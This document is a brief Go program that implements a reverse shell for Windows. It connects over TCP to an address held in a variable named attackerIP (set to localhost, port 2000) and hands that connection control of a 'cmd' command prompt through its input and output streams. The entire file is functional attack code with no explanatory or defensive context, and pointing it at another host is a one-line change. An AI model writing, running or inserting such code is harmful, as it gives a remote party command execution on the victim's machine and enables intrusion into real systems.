package main

import (
	"fmt"
	"net"
	"os/exec"
)

func main() {
	attackerIP := "127.0.0.1"
	attackerPort := "2000"

	conn, err := net.Dial("tcp", attackerIP+":"+attackerPort)
	if err != nil {
		fmt.Println("Error connecting:", err)
		return
	}
	defer conn.Close()

	cmd := exec.Command("cmd")
	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn

	if err := cmd.Start(); err != nil {
		fmt.Println("Error starting command prompt:", err)
		return
	}

	if err := cmd.Wait(); err != nil {
		fmt.Println("Error waiting for command prompt:", err)
		return
	}
}
